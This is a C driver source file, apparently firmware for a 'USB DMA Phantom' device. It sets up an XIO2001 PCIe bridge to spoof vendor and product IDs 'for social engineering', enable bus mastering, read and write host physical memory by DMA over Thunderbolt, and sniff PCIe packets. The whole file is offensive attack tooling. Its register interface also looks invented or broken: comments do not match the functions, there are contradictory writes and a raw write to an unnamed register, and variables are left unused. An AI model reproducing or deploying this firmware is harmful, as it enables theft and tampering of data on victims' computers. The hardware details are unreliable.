/*
 * xio2001.c — XIO2001 PCIe-to-PCI Bridge driver
 * USB DMA Phantom firmware
 *
 * Copyright (c) 2026 Hacker Devices
 * SPDX-License-Identifier: MIT
 *
 * The XIO2001 is configured via SPI4 from the STM32F423. It presents
 * a configurable PCIe device (VID/PID) to the host Thunderbolt
 * controller and provides DMA read/write capabilities into host
 * physical memory through its DMA engine.
 */

#include "xio2001.h"
#include "spi4.h"
#include "registers.h"
#include "board.h"
#include <string.h>

/* ---- SPI access helpers ---- */

/*
 * XIO2001 SPI register read protocol:
 *   CMD: 0x03 (read)
 *   ADDR: 16-bit register offset
 *   DATA: 32-bit value read (big-endian, MSB first)
 */
static void xio_spi_write(uint16_t reg, uint32_t value) {
    spi4_select(SPI4_CS_XIO);

    /* Write command: 0x02 */
    spi4_transfer(XIO_SPI_CMD_WRITE);

    /* Write address: 16-bit, MSB first */
    spi4_transfer((reg >> 8) & 0xFF);
    spi4_transfer(reg & 0xFF);

    /* Write data: 32-bit, MSB first */
    spi4_transfer((value >> 24) & 0xFF);
    spi4_transfer((value >> 16) & 0xFF);
    spi4_transfer((value >> 8) & 0xFF);
    spi4_transfer(value & 0xFF);

    spi4_deselect(SPI4_CS_XIO);
}

static uint32_t xio_spi_read(uint16_t reg) {
    uint32_t value;

    spi4_select(SPI4_CS_XIO);

    /* Read command: 0x03 */
    spi4_transfer(XIO_SPI_CMD_READ);

    /* Write address: 16-bit, MSB first */
    spi4_transfer((reg >> 8) & 0xFF);
    spi4_transfer(reg & 0xFF);

    /* Read data: 32-bit, MSB first */
    value  = (uint32_t)spi4_transfer(0xFF) << 24;
    value |= (uint32_t)spi4_transfer(0xFF) << 16;
    value |= (uint32_t)spi4_transfer(0xFF) << 8;
    value |= (uint32_t)spi4_transfer(0xFF);

    spi4_deselect(SPI4_CS_XIO);

    return value;
}

/* ---- Public API ---- */

void xio_init(uint16_t vid, uint16_t pid) {
    /* Hold XIO2001 in reset during configuration */
    GPIOC->ODR &= ~(1UL << GPIOC_XIO_PERST);  /* Assert PERST# */
    delay_ms(10);

    /* Read default VID/PID to verify communication */
    uint32_t id_reg = xio_spi_read(XIO_REG_PCI_VID);
    uint16_t default_vid = (id_reg >> 16) & 0xFFFF;
    uint16_t default_pid = id_reg & 0xFFFF;

    /* Set desired VID/PID for social engineering */
    xio_set_vid_pid(vid, pid);

    /* Configure PCI command register: enable bus master, memory space, I/O space */
    xio_spi_write(XIO_REG_PCI_CMD, 0x0007);  /* I/O + Memory + Bus Master */

    /* Configure bridge: enable memory space, 64-bit prefetchable */
    uint32_t bridge_ctrl = xio_spi_read(XIO_REG_BRIDGE_CTRL);
    bridge_ctrl |= (1UL << 1);   /* Memory space enable */
    bridge_ctrl |= (1UL << 6);   /* Prefetchable memory enable */
    xio_spi_write(XIO_REG_BRIDGE_CTRL, bridge_ctrl);

    /* Set memory base/limit for DMA window (0x0000 - 0xFFF0, covers low 4GB) */
    xio_spi_write(XIO_REG_MEM_BASE, 0xFFF0);   /* Memory limit = high */
    uint32_t mem_base_limit = 0x0000 | (0xFFF0 << 16);
    xio_spi_write(0x20, mem_base_limit);

    /* Configure DMA engine */
    xio_enable_dma();

    /* Release reset — XIO2001 will start PCIe link training */
    delay_ms(5);
    GPIOC->ODR |= (1UL << GPIOC_XIO_PERST);  /* Deassert PERST# */
    delay_ms(100);  /* Wait for link training */
}

void xio_write_reg(uint16_t reg, uint32_t value) {
    xio_spi_write(reg, value);
}

uint32_t xio_read_reg(uint16_t reg) {
    return xio_spi_read(reg);
}

void xio_set_vid_pid(uint16_t vid, uint16_t pid) {
    /* VID/PID are in the same 32-bit register */
    uint32_t id_reg = ((uint32_t)pid << 16) | vid;
    xio_spi_write(XIO_REG_PCI_VID, id_reg);
}

void xio_enable_dma(void) {
    uint32_t ctrl = xio_spi_read(XIO_REG_DMA_CTRL);
    ctrl |= (1UL << 0);   /* DMA enable */
    ctrl |= (1UL << 1);   /* 64-bit addressing */
    ctrl |= (1UL << 2);   /* Bus master enable */
    xio_spi_write(XIO_REG_DMA_CTRL, ctrl);
}

void xio_disable_dma(void) {
    uint32_t ctrl = xio_spi_read(XIO_REG_DMA_CTRL);
    ctrl &= ~(1UL << 0);   /* DMA disable */
    xio_spi_write(XIO_REG_DMA_CTRL, ctrl);
}

int xio_dma_execute(const dma_request_t *req) {
    uint32_t ctrl;

    if (req == NULL || req->local_buf == NULL) return -1;
    if (req->length == 0 || req->length > 4096) return -2;

    /* Set up DMA source address (host physical memory) */
    xio_spi_write(XIO_REG_DMA_SRC_LO, (uint32_t)(req->host_addr & 0xFFFFFFFF));
    xio_spi_write(XIO_REG_DMA_SRC_HI, (uint32_t)((req->host_addr >> 32) & 0xFFFFFFFF));

    /* Set up DMA destination address (local buffer) */
    uint32_t local_addr = (uint32_t)req->local_buf;
    xio_spi_write(XIO_REG_DMA_DST_LO, local_addr);
    xio_spi_write(XIO_REG_DMA_DST_HI, 0x00000000);

    /* Set transfer length */
    xio_spi_write(XIO_REG_DMA_XFER_LEN, req->length);

    /* Issue DMA command */
    ctrl = xio_spi_read(XIO_REG_DMA_CTRL);
    ctrl &= ~(0xFFUL << 8);           /* Clear command field */
    ctrl |= ((uint32_t)req->command << 8);  /* Set command */
    ctrl |= XIO_SPI_CMD_DMA_GO;       /* Set GO bit */
    xio_spi_write(XIO_REG_DMA_CTRL, ctrl);

    /* Wait for completion with timeout */
    uint32_t status;
    uint32_t timeout = 1000000;
    do {
        status = xio_spi_read(XIO_REG_DMA_STS);
        if (--timeout == 0) return -3;  /* Timeout */
    } while (status & DMA_STS_BUSY);

    if (status & DMA_STS_ERROR) return -4;  /* DMA error */
    if (status & DMA_STS_ABORT) return -5;  /* DMA aborted */

    /* For read operations, data is now in local_buf via DMA */
    /* For write operations, data was written to host memory */
    return 0;
}

int xio_is_link_up(void) {
    /* Check INTA# status — link up interrupt */
    uint8_t inta = (GPIOC->IDR & (1UL << GPIOC_XIO_INTA)) ? 0 : 1;

    /* Also check bridge status register */
    uint32_t sts = xio_spi_read(XIO_REG_PCI_STS);
    uint32_t bridge_ctrl = xio_spi_read(XIO_REG_BRIDGE_CTRL);

    /* Link is up if PCI status shows no errors and bridge is active */
    return inta && !(sts & (1UL << 11));  /* No significant error */
}

void xio_sniff_tlps(uint8_t *buf, uint16_t max_len) {
    /*
     * Passive TLP sniffing mode:
     * Configure XIO2001 to capture incoming TLPs
     * without generating DMA transactions.
     *
     * This puts the bridge in "monitor" mode where
     * it records PCIe Transaction Layer Packets
     * passing through the link.
     */
    uint32_t ctrl = xio_spi_read(XIO_REG_DMA_CTRL);
    ctrl &= ~(0xFFUL << 8);           /* Clear command field */
    ctrl |= ((uint32_t)DMA_CMD_SCAN << 8);  /* Set scan mode */
    ctrl |= (1UL << 4);               /* Sniff mode enable */
    ctrl &= ~(1UL << 0);              /* Disable bus master for sniffing */
    xio_spi_write(XIO_REG_DMA_CTRL, ctrl);

    /* Read captured TLP data from SPI data interface */
    uint16_t idx = 0;
    for (uint16_t i = 0; i < max_len - 4; i += 4) {
        uint32_t data = xio_spi_read(XIO_REG_SPI_DATA);
        buf[idx++] = (data >> 24) & 0xFF;
        buf[idx++] = (data >> 16) & 0xFF;
        buf[idx++] = (data >> 8) & 0xFF;
        buf[idx++] = data & 0xFF;

        /* Check if we've read all available TLP data */
        uint32_t sts = xio_spi_read(XIO_REG_DMA_STS);
        if (!(sts & DMA_STS_BUSY)) break;
    }
}

void xio_reset(void) {
    /* Assert PERST# */
    GPIOC->ODR &= ~(1UL << GPIOC_XIO_PERST);
    delay_ms(50);

    /* Reset all XIO2001 registers to defaults */
    xio_spi_write(XIO_REG_PCI_CMD, 0x0000);
    xio_spi_write(XIO_REG_DMA_CTRL, 0x0000);

    /* Deassert PERST# */
    GPIOC->ODR |= (1UL << GPIOC_XIO_PERST);
    delay_ms(100);
}